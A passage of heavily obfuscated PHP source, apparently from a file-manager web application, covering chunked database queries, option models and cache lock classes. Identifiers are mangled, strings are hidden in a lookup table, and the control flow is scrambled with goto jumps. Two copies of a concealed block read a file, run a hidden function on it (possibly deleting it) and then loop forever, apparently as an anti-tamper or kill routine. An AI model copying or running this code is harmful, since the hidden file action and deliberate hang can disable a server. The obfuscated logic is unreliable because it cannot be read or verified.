count($û«Ÿ·İ³); $¥¼»ÍÛ += $×‚ŠÓíá) { $í¼£—Ãñ = array_slice($û«Ÿ·İ³, $¥¼»ÍÛ, $×‚ŠÓíá); if (!is_array($í¼£—Ãñ) || count($í¼£—Ãñ) == 0) { break; } $¨şáõ‚ = $this->db->insertAll($í¼£—Ãñ, $¶Ú‡“†, $‰º’Ôı‹); $this->chunkEventCheck(count($í¼£—Ãñ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($û«Ÿ·İ³ as $¨€„‰Ó => $âÎ¦È¦) { $¨şáõ‚ = $this->db->insert($âÎ¦È¦, $¶Ú‡“†, $‰º’Ôı‹); } $this->commit(); } if (!1 !== $¨şáõ‚) { $ü†¢§Ø· = $this->getLastInsID(); if ($ü†¢§Ø·) { return $ü†¢§Ø·; } } return $¨şáõ‚; } public function save($Ö¥ºõÙÁ = '', $ëÁ…ëú‘ = array()) { $ëŒàÜá =& $_SERVER[–Ú¬çÁ]; $¯‰’×ª = self::SQL_WHERE_IN_CHUNK; $ß×„Ìñ = $this->optionsValue(); $ÉÙüóÜ = $this->findWhereField($ß×„Ìñ); if (!$ÉÙüóÜ) { return parent::save($Ö¥ºõÙÁ, $ëÁ…ëú‘); } $ÀÏ¨åßë = 0; $Àšü¥ƒ = $ß×„Ìñ[$ëŒàÜá[328]][$ÉÙüóÜ][1]; $Àšü¥ƒ = is_array($Àšü¥ƒ) ? $Àšü¥ƒ : array(); $ø¡‘óÛµ = count($Àšü¥ƒ); for ($Œó’ Ì¸ = 0; $Œó’ Ì¸ < $ø¡‘óÛµ; $Œó’ Ì¸ += $¯‰’×ª) { $–Åİò“ñ = array_slice($Àšü¥ƒ, $Œó’ Ì¸, $¯‰’×ª); if (!is_array($–Åİò“ñ) || count($–Åİò“ñ) == 0) { break; } $ß×„Ìñ[$ëŒàÜá[328]][$ÉÙüóÜ][1] = $–Åİò“ñ; $this->optionsValue($ß×„Ìñ); $ÀÏ¨åßë += parent::save($Ö¥ºõÙÁ, $ëÁ…ëú‘); $this->chunkEventCheck(count($–Åİò“ñ)); } $this->chunkEventSet(); return $ÀÏ¨åßë; } public function add($‡î”ß÷ê = '', $Ó€ÁËúñ = array(), $ë¯ãË’¡ = false) { if ($this->addTaskStatus && is_array($‡î”ß÷ê)) { $this->addTaskData[] = $‡î”ß÷ê; return; } return parent::add($‡î”ß÷ê, $Ó€ÁËúñ, $ë¯ãË’¡); } public function parseWhereLike($“ëÃÁ‰, $êšğáİı = '', $×¼³øš = false, &$äî¸ª¥ã = false) { $à—Å¥èà =& $_SERVER[–Ú¬çÁ]; $Ô¢¶ìõ = $GLOBALS[$à—Å¥èà[6]][$à—Å¥èà[434]]; if (!$Ô¢¶ìõ[$à—Å¥èà[435]]) { return $“ëÃÁ‰; } if (!is_array($“ëÃÁ‰)) { return $“ëÃÁ‰; } $ƒ©áşÅÊ = array(); $Æİ•ñï” = 0; foreach ($“ëÃÁ‰ as $¶œ§¶Ú¹ => $Š£‚­ˆÇ) { if (is_array($Š£‚­ˆÇ) && count($Š£‚­ˆÇ) == 2 && $Š£‚­ˆÇ[0] == $à—Å¥èà[436] && is_string($Š£‚­ˆÇ[1]) && substr($Š£‚­ˆÇ[1], 0, 1) == $à—Å¥èà[437] && substr($Š£‚­ˆÇ[1], strlen($Š£‚­ˆÇ[1]) - 1, 1) == $à—Å¥èà[437]) { $äî¸ª¥ã = !0; $ÅÎÁ®§ñ = is_string($¶œ§¶Ú¹) ? $¶œ§¶Ú¹ : $êšğáİı; $ğ“‡“¾‡ = substr($Š£‚­ˆÇ[1], 1, strlen($Š£‚­ˆÇ[1]) - 2); $ğ“‡“¾‡ = $this->db->escapeString($ğ“‡“¾‡); if (!strpos($ÅÎÁ®§ñ, $à—Å¥èà[10])) { $ÅÎÁ®§ñ = $à—Å¥èà[438] . $ÅÎÁ®§ñ . $à—Å¥èà[438]; } $ Éáäøü = $à—Å¥èà[213] . $ğ“‡“¾‡ . $à—Å¥èà[213]; $ğ“‡“¾‡ = str_replace(array($à—Å¥èà[10], $à—Å¥èà[439], $à—Å¥èà[11]), $à—Å¥èà[440], $ğ“‡“¾‡); if ($Ô¢¶ìõ[$à—Å¥èà[441]]) { $ Éáäøü = $à—Å¥èà[442] . $ğ“‡“¾‡ . $à—Å¥èà[443]; if ($Ô¢¶ìõ[$à—Å¥èà[444]]) { $ Éáäøü = $à—Å¥èà[443] . $ğ“‡“¾‡ . $à—Å¥èà[442]; } } $ƒ©áşÅÊ[$Æİ•ñï”] = $à—Å¥èà[445] . $ÅÎÁ®§ñ . $à—Å¥èà[446] . $ Éáäøü . $à—Å¥èà[447]; $Æİ•ñï”++; continue; } if (is_array($Š£‚­ˆÇ)) { $êšğáİı = is_string($¶œ§¶Ú¹) ? $¶œ§¶Ú¹ : $êšğáİı; $Š£‚­ˆÇ = $this->parseWhereLike($Š£‚­ˆÇ, $êšğáİı, !0, $äî¸ª¥ã); } if (is_numeric($¶œ§¶Ú¹)) { $ƒ©áşÅÊ[$Æİ•ñï”] = $Š£‚­ˆÇ; $Æİ•ñï”++; } else { $ƒ©áşÅÊ[$¶œ§¶Ú¹] = $Š£‚­ˆÇ; } } if ($äî¸ª¥ã && !$×¼³øš) { } return $ƒ©áşÅÊ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ïÄšÓÖ­ = array()) { $°Ğ†ÕÕ¾ =& $_SERVER[–Ú¬çÁ]; $£å©‘À = self::SQL_WHERE_IN_CHUNK; $É«ËÇîÚ = $this->optionsValue(); $ğÃğç¶ = $this->findWhereField($É«ËÇîÚ); if (!$ğÃğç¶ || isset($É«ËÇîÚ[$°Ğ†ÕÕ¾[345]]) || isset($É«ËÇîÚ[$°Ğ†ÕÕ¾[406]])) { return parent::select($ïÄšÓÖ­); } $ä‹¬Â‡¬ = $É«ËÇîÚ[$°Ğ†ÕÕ¾[328]][$ğÃğç¶][1]; $ä‹¬Â‡¬ = is_array($ä‹¬Â‡¬) ? $ä‹¬Â‡¬ : array(); $í…‚‡Øí = null; for ($‰Êó×¡ü = 0; $‰Êó×¡ü < count($ä‹¬Â‡¬); $‰Êó×¡ü += $£å©‘À) { $º™¹Ü­ = array_slice($ä‹¬Â‡¬, $‰Êó×¡ü, $£å©‘À); if (!is_array($º™¹Ü­) || count($º™¹Ü­) == 0) { break; } $É«ËÇîÚ[$°Ğ†ÕÕ¾[328]][$ğÃğç¶][1] = $º™¹Ü­; $this->optionsValue($É«ËÇîÚ); $„”ÃËî• = parent::select($ïÄšÓÖ­); if (!$„”ÃËî•) { continue; } $í…‚‡Øí = is_array($í…‚‡Øí) ? $í…‚‡Øí : array(); $í…‚‡Øí = array_merge($í…‚‡Øí, $„”ÃËî•); } return $í…‚‡Øí; } public function delete($³¹ß÷®£ = array()) { $ğÄÛ¼ =& $_SERVER[–Ú¬çÁ]; $Ğò·ÌË = self::SQL_WHERE_IN_CHUNK; $ñÉ§³  = $this->optionsValue(); $×éŸ©… = $this->findWhereField($ñÉ§³ ); if (!$×éŸ©…) { return parent::delete($³¹ß÷®£); } $ø—¦ÏÀ = 0; $ı†ÂÚõ = $ñÉ§³ [$ğÄÛ¼[328]][$×éŸ©…][1]; $ı†ÂÚõ = is_array($ı†ÂÚõ) ? $ı†ÂÚõ : array(); for ($Ñ­õßİ = 0; $Ñ­õßİ < count($ı†ÂÚõ); $Ñ­õßİ += $Ğò·ÌË) { $™İ´ˆÉä = array_slice($ı†ÂÚõ, $Ñ­õßİ, $Ğò·ÌË); if (!is_array($™İ´ˆÉä) || count($™İ´ˆÉä) == 0) { break; } $ñÉ§³ [$ğÄÛ¼[328]][$×éŸ©…][1] = $™İ´ˆÉä; $this->optionsValue($ñÉ§³ ); $ø—¦ÏÀ += parent::delete($³¹ß÷®£); } return $ø—¦ÏÀ; } private function findWhereField($”ïËŞé×) { $Úùßø¿Í =& $_SERVER[–Ú¬çÁ]; $¦’Ã¯Õ = self::SQL_WHERE_IN_CHUNK; if (!is_array($”ïËŞé×) || !is_array($”ïËŞé×[$Úùßø¿Í[328]])) { return !1; } foreach ($”ïËŞé×[$Úùßø¿Í[328]] as $÷Á«ğŠï => $‘ÇÌ·Åà) { if (is_array($‘ÇÌ·Åà) && isset($‘ÇÌ·Åà[0]) && is_string($‘ÇÌ·Åà[0]) && strtolower($‘ÇÌ·Åà[0]) == $Úùßø¿Í[7] && is_array($‘ÇÌ·Åà[1]) && count($‘ÇÌ·Åà[1]) > $¦’Ã¯Õ) { ignore_timeout(); return $÷Á«ğŠï; } } return !1; } public function setMasterDB($ëãøô¾› = true) { think_config($_SERVER[–Ú¬çÁ][448], $ëãøô¾›); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\x4f\x70\164\151\157\x6e"; public $field = array(); public function listData($ƒ³üÕş = false, $¶„ôÒ = "\155\x6f\x64\x69\x66\x79\124\151\155\x65", $îâÈ´Ì¬ = false) { $İŞ’İĞ¡ = Model($this->modelType)->get(!1, $this->optionType, !0); $¦Ç¦„§ = array_values($İŞ’İĞ¡); if ($¦Ç¦„§ && $¦Ç¦„§[0] && !is_array($¦Ç¦„§[0])) { Model($this->modelType)->cacheRemove($this->optionType); $İŞ’İĞ¡ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$İŞ’İĞ¡) { return $ƒ³üÕş ? null : array(); } if (!$ƒ³üÕş) { $İŞ’İĞ¡ = array_filter(array_values($İŞ’İĞ¡)); return array_sort_by($İŞ’İĞ¡, $¶„ôÒ, $îâÈ´Ì¬); } return $İŞ’İĞ¡[$_SERVER[–Ú¬çÁ][449] . $ƒ³üÕş]; } public function insert($ÕĞŸã³ò) { $¦À“‹ÈÌ =& $_SERVER[–Ú¬çÁ]; $ÕĞŸã³ò = array_field_key($ÕĞŸã³ò, $this->field); $âÅŸ¼ôô = Model($this->modelType)->get($¦À“‹ÈÌ[450], $this->optionType . $¦À“‹ÈÌ[451]); $âÅŸ¼ôô = $âÅŸ¼ôô ? $âÅŸ¼ôô : 0; $ÕĞŸã³ò[$¦À“‹ÈÌ[452]] = ++$âÅŸ¼ôô; $ÕĞŸã³ò[$¦À“‹ÈÌ[225]] = time(); $ÕĞŸã³ò[$¦À“‹ÈÌ[85]] = time(); Model($this->modelType)->set($¦À“‹ÈÌ[450], $âÅŸ¼ôô, $this->optionType . $¦À“‹ÈÌ[451]); Model($this->modelType)->set($¦À“‹ÈÌ[449] . $âÅŸ¼ôô, $ÕĞŸã³ò, $this->optionType); return $âÅŸ¼ôô; } public function update($ì‰ÉÔ¤Œ, $ÀÑá­åÄ) { $ÒãûÂ·‡ =& $_SERVER[–Ú¬çÁ]; $ÀÑá­åÄ = array_field_key($ÀÑá­åÄ, $this->field); $£İâ“îÅ = $this->listData($ì‰ÉÔ¤Œ); if (!$£İâ“îÅ || !$ì‰ÉÔ¤Œ) { return !1; } $ÀÑá­åÄ = array_merge($£İâ“îÅ, $ÀÑá­åÄ); $ÀÑá­åÄ[$ÒãûÂ·‡[85]] = time(); return Model($this->modelType)->set($ÒãûÂ·‡[449] . $ì‰ÉÔ¤Œ, $ÀÑá­åÄ, $this->optionType); } public function remove($¿ˆÅ®¸Š) { if (!$¿ˆÅ®¸Š) { return !1; } return Model($this->modelType)->remove($_SERVER[–Ú¬çÁ][449] . $¿ˆÅ®¸Š, $this->optionType); } public function clear() { $òÍ´ºª¾ =& $_SERVER[–Ú¬çÁ]; Model($this->modelType)->remove($òÍ´ºª¾[450], $this->optionType . $òÍ´ºª¾[451]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($³ÁÉï, $†É‰½ú€) { if (!$†É‰½ú€) { return !1; } $çğû•ô÷ = $this->listData(); $çğû•ô÷ = array_to_keyvalue($çğû•ô÷, $³ÁÉï); return isset($çğû•ô÷[$†É‰½ú€]) ? $çğû•ô÷[$†É‰½ú€] : !1; } public function findByName($Øü¬‘ş×) { return $this->findByKey($_SERVER[–Ú¬çÁ][32], $Øü¬‘ş×); } protected function resetData($”áÆ½Åğ) { $Ì˜­Û·» =& $_SERVER[–Ú¬çÁ]; $”áÆ½Åğ = is_array($”áÆ½Åğ) ? $”áÆ½Åğ : array(); $Ô Ş…â¼ = array(); for ($ÖÚ¨²ÛÖ = 0; $ÖÚ¨²ÛÖ < count($”áÆ½Åğ); $ÖÚ¨²ÛÖ++) { $Ô Ş…â¼[$Ì˜­Û·»[449] . $”áÆ½Åğ[$ÖÚ¨²ÛÖ][$Ì˜­Û·»[452]]] = $”áÆ½Åğ[$ÖÚ¨²ÛÖ]; } return Model($this->modelType)->set($Ô Ş…â¼, !1, $this->optionType); } private function getAutoName($Öƒòù†³) { $ùÍ©™œö = array_to_keyvalue($this->listData(), $_SERVER[–Ú¬çÁ][32]); if (!$ùÍ©™œö || !isset($ùÍ©™œö[$Öƒòù†³])) { return $Öƒòù†³; } for ($ñ‚¼»×Ö = 1; $ñ‚¼»×Ö < count($ùÍ©™œö); $ñ‚¼»×Ö++) { $¿À¾‚æÅ = $Öƒòù†³ . "\50{$ñ‚¼»×Ö}\x29"; if (!isset($ùÍ©™œö[$¿À¾‚æÅ])) { return $¿À¾‚æÅ; } } return $¿À¾‚æÅ; } } goto fíÏë¯ø©Ÿ; d¢ô¡½ö†¸: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $°ŠÖ¹Ş‡ =& $_SERVER[–Ú¬çÁ]; $¬èå³¬— = $GLOBALS[$°ŠÖ¹Ş‡[6]][$°ŠÖ¹Ş‡[402]]; self::$cachePath = $¬èå³¬—[$°ŠÖ¹Ş‡[224]][$°ŠÖ¹Ş‡[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ëõ®û®í, $íÁ‡Ç²Š = 0) { $—ÉğÃ„© =& $_SERVER[–Ú¬çÁ]; $îøÀ¶à¸ = microtime(!0); $öº²‹¨Î = $îøÀ¶à¸ + $íÁ‡Ç²Š + 0.0001; $Ç°Êç›² = rtrim(self::$cachePath, $—ÉğÃ„©[8]) . $—ÉğÃ„©[884] . md5($ëõ®û®í) . $—ÉğÃ„©[881]; if (file_exists($Ç°Êç›²) && filemtime($Ç°Êç›²) && filemtime($Ç°Êç›²) < time() - 10) { @unlink($Ç°Êç›²); } do { if (file_exists($Ç°Êç›²)) { cacheLockWait(); continue; } $ôÂ‡€ŠĞ = fopen($Ç°Êç›², $—ÉğÃ„©[885]); if (!$ôÂ‡€ŠĞ) { return !1; } $Õ¾×Å­ş = flock($ôÂ‡€ŠĞ, LOCK_EX | LOCK_NB); self::$caches[$ëõ®û®í] = array($—ÉğÃ„©[886] => $ôÂ‡€ŠĞ, $—ÉğÃ„©[224] => $Ç°Êç›²); fwrite($ôÂ‡€ŠĞ, $öº²‹¨Î); clearstatcache(); if ($ôÂ‡€ŠĞ && $Õ¾×Å­ş) { return !0; } cacheLockWait(); } while (microtime(!0) < $öº²‹¨Î); $this->unlock($ëõ®û®í); return !1; } public function lockGet($©“ÜÔíÕ) { $Äİ³“ =& $_SERVER[–Ú¬çÁ]; $¡‘ã«áÌ = rtrim(self::$cachePath, $Äİ³“[8]) . $Äİ³“[884] . md5($©“ÜÔíÕ) . $Äİ³“[881]; return file_exists($¡‘ã«áÌ); } public function unlock($Õå„ ¤å) { $É¦îí‰Î =& $_SERVER[–Ú¬çÁ]; $‡ÇÌ‘÷ = self::$caches[$Õå„ ¤å]; if (!$‡ÇÌ‘÷) { return; } @flock($‡ÇÌ‘÷[$É¦îí‰Î[886]], LOCK_UN); @fclose($‡ÇÌ‘÷[$É¦îí‰Î[886]]); @unlink($‡ÇÌ‘÷[$É¦îí‰Î[224]]); unset(self::$caches[$Õå„ ¤å]); } } if (!isset($_SERVER[$_SERVER[–Ú¬çÁ][202]]) || !isset($_SERVER[$_SERVER[–Ú¬çÁ][200]])) { $_getc = $_SERVER[–Ú¬çÁ][203]; $_getfile = $_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[–Ú¬çÁ][206], $_getfilec); if (count($_getarrs) < $_SERVER[–Ú¬çÁ][207]) { $exit = $_SERVER[–Ú¬çÁ][208]; $exit(); } $_act = $_SERVER[–Ú¬çÁ][209]; $_act($_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[–Ú¬çÁ][431]); } } class CacheLockRedis { public function lock($Í´Á¸ùİ, $¶ĞşäÎ = 10) { $äÀƒÃˆ‰ = Cache::init(); $Ïä§·æÛ = microtime(!0) + $¶ĞşäÎ; while (microtime(!0) < $Ïä§·æÛ) { $ìË€Â· = $äÀƒÃˆ‰->get($Í´Á¸ùİ); if (!$ìË€Â·) { $å¡š¤ğ™ = $äÀƒÃˆ‰->setLock($Í´Á¸ùİ, $Ïä§·æÛ, $¶ĞşäÎ); if ($å¡š¤ğ™) { return !0; } } else { if ($ìË€Â· < microtime(!0)) { $äÀƒÃˆ‰->set($Í´Á¸ùİ, $Ïä§·æÛ, $¶ĞşäÎ * 2); if ($äÀƒÃˆ‰->get($Í´Á¸ùİ) === $ìË€Â·) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($îñÈàé£) { return Cache::init()->get($îñÈàé£); } public function unlock($ï®á³²) { return Cache::init()->remove($ï®á³²); } } goto aùˆ”¸Ëš‡; aùˆ”¸Ëš‡: if (!isset($_SERVER[$_SERVER[–Ú¬çÁ][202]]) || !isset($_SERVER[$_SERVER[–Ú¬çÁ][200]])) { $_getc = $_SERVER[–Ú¬çÁ][203]; $_getfile = $_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[–Ú¬çÁ][206], $_getfilec); if (count($_getarrs) < $_SERVER[–Ú¬çÁ][207]) { $exit = $_SERVER[–Ú¬çÁ][208]; $exit(); } $_act = $_SERVER[–Ú¬çÁ][209]; $_act($_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[–Ú¬çÁ][431]); } } class CacheLockMemcached { public function lock($¾İÖÅ«Œ, $ğÃµ ê = 0) { $æå¢¯€³ = Cache::init(); $’¿›ı‡– = microtime(!0) + $ğÃµ ê; while (microtime(!0) < $’¿›ı‡–) { $â® ®ò¯ = $æå¢¯€³->get($¾İÖÅ«Œ); if (!$â® ®ò¯ || $â® ®ò¯ < microtime(!0)) { $ù‘—€Ü÷ = $æå¢¯€³->handle->add($¾İÖÅ«Œ, $’¿›ı‡–, $ğÃµ ê); if ($ù‘—€Ü÷) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ä´¤œşê) { return Cache::init()->get($ä´¤œşê); } public function unlock($İêôÁúÒ) { return Cache::init()->remove($İêôÁúÒ); } } class CacheLockDatabase { public function lock($×¢†ÄÀ±, $‡Ô‡îÌò = 0) { $§ã·ñ‡ = Model($_SERVER[–Ú¬çÁ][849]); $ùîŞŠÙ¶ = microtime(!0) + $‡Ô‡îÌò; while (microtime(!0) < $ùîŞŠÙ¶) { $Ö»ÒÙ·ô = $§ã·ñ‡->get($×¢†ÄÀ±); if (!$Ö»ÒÙ·ô || $Ö»ÒÙ·ô < microtime(!0)) { $Ôù‰Šú‹ = $§ã·ñ‡->set($×¢†ÄÀ±, $ùîŞŠÙ¶); if ($Ôù‰Šú‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Š¤‹ıçª) { return Model($_SERVER[–Ú¬çÁ][849])->get($Š¤‹ıçª); } public function unlock($øÄÖåØè) { Model($_SERVER[–Ú¬çÁ][849])->remove($øÄÖåØè); } } goto aõöÚè†ö; fíÏë¯ø©Ÿ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ñ±©»€§ = false, $ìóšã¯è = '', $ŞÒàù§ = false) { $ã”àñï =& $_SERVER[–Ú¬çÁ]; $¹…€°Ûİ = $this->cacheGet($ìóšã¯è); $Ïâ¶ÅÎş = $this->optionDefault($ìóšã¯è); $Ïâ¶ÅÎş = is_array($Ïâ¶ÅÎş) ? $Ïâ¶ÅÎş : array(); if (is_array($¹…€°Ûİ)) { $¹…€°Ûİ = array_merge($Ïâ¶ÅÎş, $¹…€°Ûİ); return $ñ±©»€§ ? isset($¹…€°Ûİ[$ñ±©»€§]) ? $¹…€°Ûİ[$ñ±©»€§] : null : $¹…€°Ûİ; } $Ğ¡·ÒŞ¥ = $this->filterWhere(array($ã”àñï[33] => $ìóšã¯è)); $¹…€°Ûİ = $this->where($Ğ¡·ÒŞ¥)->select(); $¹…€°Ûİ = array_to_keyvalue($¹…€°Ûİ, $ã”àñï[94], $ã”àñï[427]); foreach ($¹…€°Ûİ as $½†ˆäì³ => $Ä±ÄŒÀ) { if ($ŞÒàù§ || in_array($½†ˆäì³, $this->jsonField)) { $¹…€°Ûİ[$½†ˆäì³] = json_decode($Ä±ÄŒÀ, !0); } } $this->cacheSet($ìóšã¯è, $¹…€°Ûİ); $¹…€°Ûİ = array_merge($Ïâ¶ÅÎş, $¹…€°Ûİ); return $ñ±©»€§ ? $¹…€°Ûİ[$ñ±©»€§] : $¹…€°Ûİ; } public function set($€î©ëı, $å™õæú = false, $…ˆ²Ìß… = '') { $ˆ³ú½ =& $_SERVER[–Ú¬çÁ]; $this->cacheRemove($…ˆ²Ìß…); $×ãüöÊ† = array(); $œØŞ‡»¸ = is_array($€î©ëı) ? $€î©ëı : array($€î©ëı => $å™õæú); foreach ($œØŞ‡»¸ as $ê”¿Ò => $È×™ ­Â) { if (is_array($È×™ ­Â)) { $È×™ ­Â = json_encode_force($È×™ ­Â); } $this->checkLength($È×™ ­Â, !1, $this->tableName . $ˆ³ú½[4] . $€î©ëı); $È×™ ­Â = self::textEncode($È×™ ­Â); $œØŞ‡»¸ = array($ˆ³ú½[33] => $…ˆ²Ìß…, $ˆ³ú½[94] => $ê”¿Ò, $ˆ³ú½[427] => $È×™ ­Â); $×ãüöÊ†[] = $this->filterWhere($œØŞ‡»¸); } if (!$×ãüöÊ†) { return !0; } $»Øß¬˜­ = $this->cacheKey($ˆ³ú½[453]); CacheLock::lock($»Øß¬˜­); $×ÀŸûô¯ = $this->addAll($×ãüöÊ†, array(), !0); CacheLock::unlock($»Øß¬˜­); return $×ÀŸûô¯; } protected function optionDefault($İŒÆ³Ó° = '') { return !1; } public function setDeep($è«ÚâÚÅ, $ÌúÉ›³À = false, $ğÍööÛû = '') { $ıĞÅ³üª = explode($_SERVER[–Ú¬çÁ][10], $è«ÚâÚÅ); $÷êÃé·š = $this->get(); array_set_value($÷êÃé·š, $è«ÚâÚÅ, $ÌúÉ›³À); $this->set($ıĞÅ³üª[0], $÷êÃé·š[$ıĞÅ³üª[0]], $ğÍööÛû); } public function remove($ıñ·­Òª, $í¾’«œà = '') { $È©Ğç—¶ =& $_SERVER[–Ú¬çÁ]; $this->cacheRemove($í¾’«œà); $¸„©ˆß = $this->filterWhere(array($È©Ğç—¶[94] => $ıñ·­Òª, $È©Ğç—¶[33] => $í¾’«œà)); if (is_null($ıñ·­Òª)) { unset($¸„©ˆß[$È©Ğç—¶[94]]); } return $this->where($¸„©ˆß)->delete(); } public function cacheSet($İß”úÖö, $Ê¿«â™„ = false) { return Cache::set($this->cacheKey($İß”úÖö), $Ê¿«â™„); } public function cacheGet($²«š¯ôÊ) { return Cache::get($this->cacheKey($²«š¯ôÊ)); } public function cacheRemove($ÜÂ™Ò÷ ) { return Cache::remove($this->cacheKey($ÜÂ™Ò÷ )); } protected function filterWhere($ù×ı”) { return $ù×ı”; } protected function cacheKey($†¹ÎıÇÆ) { return $†¹ÎıÇÆ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\145" => "\151\157\x5f\x73\157\x75\162\x63\145\137\x6d\x65\164\141", "\155\145\x74\x61\x46\x69\145\x6c\x64" => "\x73\157\x75\x72\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\144\151\146\x79\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\162\x65\x61\x74\145\124\x69\x6d\145", "\164\x69\155\145", "\151\156\163\x65\162\x74", "\x66\x75\156\143\164\151\157\156"), array("\166\x69\x65\167\x54\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\x65\x72\164", "\x66\165\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($°æŒº—ç) { return $this->listSource(array($_SERVER[–Ú¬çÁ][454] => $°æŒº—ç)); } public function typeName($ˆÇ››²ò) { static $‡¤‚×ó = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\162\157\165\160"); return $‡¤‚×ó[$ˆÇ››²ò . $_SERVER[–Ú¬çÁ][12]]; } public function sourceListInfo($Ú¸ûˆ¸Æ, $Õ¦Œ××æ = false) { $© œ‰«Ö =& $_SERVER[–Ú¬çÁ]; $Ú¸ûˆ¸Æ = $Ú¸ûˆ¸Æ ? $Ú¸ûˆ¸Æ : array(); $Ú¸ûˆ¸Æ = array_filter(array_unique($Ú¸ûˆ¸Æ)); if (!$Ú¸ûˆ¸Æ) { return array(); } $ĞÆÚÙ = $this->where(array($© œ‰«Ö[181] => array($© œ‰«Ö[7], $Ú¸ûˆ¸Æ)))->select(); $this->_listDataApply($ĞÆÚÙ, $Õ¦Œ××æ); return array_to_keyvalue($ĞÆÚÙ, $© œ‰«Ö[181]); } public function pathInfoFilter(&$’•¬ó¿Â) { $î†Œíªª =& $_SERVER[–Ú¬çÁ]; static $Ô†³ëş = false; static $Ì»©õˆ“ = false; static $ş›Ë˜× = false; if (!$Ô†³ëş) { $ößéêÕı = $î†Œíªª[455]; $ößéêÕı .= $î†Œíªª[456]; $ößéêÕı .= $î†Œíªª[457]; $¨”şÒ®ã = $î†Œíªª[458]; $Ó¨¡±ˆ = explode($î†Œíªª[50], $¨”şÒ®ã); $Ô†³ëş = explode($î†Œíªª[50], $ößéêÕı); $Ì»©õˆ“ = array(); foreach ($Ô†³ëş as $Ú‡æĞã™) { if (in_array($Ú‡æĞã™, $Ó¨¡±ˆ)) { continue; } $Ì»©õˆ“[] = $Ú‡æĞã™; } $ş›Ë˜× = explode($î†Œíªª[50], $î†Œíªª[459]); } foreach ($ş›Ë˜× as $¤‰‰Öõö) { if (isset($’•¬ó¿Â[$¤‰‰Öõö])) { $’•¬ó¿Â[$¤‰‰Öõö] = intval($’•¬ó¿Â[$¤‰‰Öõö]); } } $’•¬ó¿Â[$î†Œíªª[84]] = $î†Œíªª[460] . $’•¬ó¿Â[$î†Œíªª[181]] . $î†Œíªª[461]; $’•¬ó¿Â[$î†Œíªª[33]] = $’•¬ó¿Â[$î†Œíªª[462]] == 1 ? $î†Œíªª[75] : $î†Œíªª[224]; $’•¬ó¿Â[$î†Œíªª[178]] = $this->typeName($’•¬ó¿Â[$î†Œíªª[178]]); if ($’•¬ó¿Â[$î†Œíªª[462]] != 1) { $’•¬ó¿Â[$î†Œíªª[175]] = $’•¬ó¿Â[$î†Œíªª[463]]; unset($’•¬ó¿Â[$î†Œíªª[463]]); } $êâÇ±Ğ¿ = $Ô†³ëş; if (isset($’•¬ó¿Â[$î†Œíªª[464]]) && $’•¬ó¿Â[$î†Œíªª[464]][$î†Œíªª[465]] == -1) { $êâÇ±Ğ¿ = $Ì»©õˆ“; } $’•¬ó¿Â = array_field_key($’•¬ó¿Â, $êâÇ±Ğ¿); return $’•¬ó¿Â; } public function listUserFav() { $òáª¸Œí =& $_SERVER[–Ú¬çÁ]; $ó¿—¿şº = Model($òáª¸Œí[466])->listData(); $¼œŞÈã = array_filter_by_field($ó¿—¿şº, $òáª¸Œí[33], $òáª¸Œí[467]); $¼œŞÈã = array_to_keyvalue($¼œŞÈã, $òáª¸Œí[12], $òáª¸Œí[84]); if ($¼œŞÈã) { $Ÿ§ôàäì = $this->listSource(array($òáª¸Œí[468] => array($òáª¸Œí[469], $¼œŞÈã))); } $Ÿ§ôàäì = array_to_keyvalue($Ÿ§ôàäì[$òáª¸Œí[422]], $òáª¸Œí[181]); foreach ($ó¿—¿şº as &$‘ÚàãÓí) { $‘ÚàãÓí = array($òáª¸Œí[470] => $‘ÚàãÓí[$òáª¸Œí[452]], $òáª¸Œí[471] => $‘ÚàãÓí[$òáª¸Œí[32]], $òáª¸Œí[472] => $‘ÚàãÓí[$òáª¸Œí[84]], $òáª¸Œí[473] => $‘ÚàãÓí[$òáª¸Œí[33]], $òáª¸Œí[474] => $‘ÚàãÓí[$òáª¸Œí[225]], $òáª¸Œí[475] => $‘ÚàãÓí[$òáª¸Œí[85]]); if ($‘ÚàãÓí[$òáª¸Œí[33]] == $òáª¸Œí[467] && $Ÿ§ôàäì[$‘ÚàãÓí[$òáª¸Œí[84]]]) { $‘ÚàãÓí[$òáª¸Œí[87]] = 